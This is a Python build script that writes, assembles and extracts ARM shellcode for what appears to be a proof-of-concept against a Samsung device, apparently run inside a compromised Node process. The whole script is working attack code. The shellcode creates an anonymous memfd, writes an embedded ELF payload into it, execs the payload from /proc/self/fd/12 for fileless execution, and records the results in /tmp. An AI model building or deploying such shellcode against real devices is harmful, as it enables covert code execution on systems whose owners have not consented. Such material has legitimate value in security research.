#!/usr/bin/env python3
import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
ZIG = ROOT / "tools" / "zig" / "zig-x86_64-windows-0.15.1" / "zig.exe"
OUT = ROOT / "outputs" / "samsung-m5" / "pocs"
PAYLOAD_ELF = OUT / "memfd_exec_payload.elf"
PROBE_S = OUT / "node_memfd_execve_fd_probe.S"
PROBE_O = OUT / "node_memfd_execve_fd_probe.o"
PROBE_BIN = OUT / "node_memfd_execve_fd_probe.bin"


def byte_lines(data: bytes) -> str:
    lines = []
    for i in range(0, len(data), 12):
        chunk = data[i : i + 12]
        lines.append("    .byte " + ",".join(f"0x{b:02x}" for b in chunk))
    return "\n".join(lines)


def main() -> None:
    if not PAYLOAD_ELF.exists():
        raise SystemExit(f"missing {PAYLOAD_ELF}; run build_memfd_fexec_probe.py first")
    payload = PAYLOAD_ELF.read_bytes()
    asm = f""".syntax unified
.arm
.global _start

_start:
    push {{r4-r9, lr}}
    adr r9, result

    @ fd = memfd_create("codex_exec", 0)
    adr r0, memfd_name
    mov r1, #0
    movw r7, #385
    svc #0
    str r0, [r9, #4]
    mov r4, r0
    cmp r0, #0
    blt write_result

    @ write(fd, payload, payload_len)
    mov r0, r4
    adr r1, payload_start
    ldr r2, payload_len
    mov r7, #4
    svc #0
    str r0, [r9, #8]
    cmp r0, #0
    blt write_result

    @ Build argv/envp on the current user stack. Avoid absolute pointers in
    @ raw shellcode because objcopy does not apply runtime relocations.
    mov r6, sp
    mov r0, #0
    push {{r0}}
    adr r5, arg0
    push {{r5}}
    mov r1, sp
    sub sp, sp, #4
    mov r2, sp

    @ execve("/proc/self/fd/12", argv, envp)
    @ The Node shellcode context has returned fd 12 consistently.
    adr r0, fd_path
    mov r7, #11
    svc #0
    mov sp, r6
    str r0, [r9, #12]

write_result:
    adr r0, out_path
    movw r1, #0x241
    movw r2, #438
    mov r7, #5
    svc #0
    mov r5, r0
    cmp r0, #0
    blt ret_ok

    mov r0, r5
    mov r1, r9
    mov r2, #16
    mov r7, #4
    svc #0

    mov r0, r5
    mov r7, #6
    svc #0

ret_ok:
    mov r0, #0
    pop {{r4-r9, pc}}

.align 2
result:
    .word 0x4446454d  @ "MEFD" little-endian
    .word 0xffffffff
    .word 0xffffffff
    .word 0xffffffff
payload_len:
    .word {len(payload)}
memfd_name:
    .asciz "codex_exec"
arg0:
    .asciz "codex_exec"
fd_path:
    .asciz "/proc/self/fd/12"
out_path:
    .asciz "/tmp/execve_fd_probe.bin"
.align 2
payload_start:
{byte_lines(payload)}
"""
    PROBE_S.write_text(asm, encoding="ascii")
    subprocess.run([str(ZIG), "cc", "-target", "arm-linux-gnueabi", "-c", str(PROBE_S), "-o", str(PROBE_O)], check=True)
    subprocess.run([str(ZIG), "objcopy", "-O", "binary", "-j", ".text", str(PROBE_O), str(PROBE_BIN)], check=True)
    print(f"probe shellcode: {PROBE_BIN} ({PROBE_BIN.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
